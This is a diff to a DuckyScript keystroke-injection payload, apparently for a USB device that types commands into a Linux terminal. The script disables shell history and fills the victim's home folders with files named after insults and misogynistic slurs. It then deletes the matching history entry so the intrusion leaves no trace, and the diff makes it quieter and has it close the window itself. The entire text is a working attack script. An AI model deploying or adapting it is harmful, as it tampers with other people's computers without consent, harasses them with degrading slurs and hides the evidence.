@@ -14,18 +14,13 @@ DELAY 300
 CTRL-ALT t
 REM adjust delay as needed
 DELAY 1500
-REM sneak +1 don't delete the whole history or mess with settings, just turn history off and delete the last entry ;)
+REM sneak +1 don't delete the whole history or mess with size settings, just turn history off and delete the history change entry ;)
 STRING set +o history
 DELAY 200
 ENTER
 DELAY 200
-STRING nohup cd /Home/Pictures && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd /Home/Documents && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd /Home/Music && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd /Home/Videos && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd /Home/Desktop && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd .. && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd .. && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line &
+STRING nohup cd /Home/Pictures && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd /Home/Documents && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd /Home/Music && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd /Home/Videos && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd /Home/Desktop && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd .. && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd .. && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
 DELAY 500
 ENTER
 DELAY 300
-CTRL c
-DELAY 500
-CTRL c
-STRING set -o history && exit
-DELAY 200
-ENTER
+ALT F4
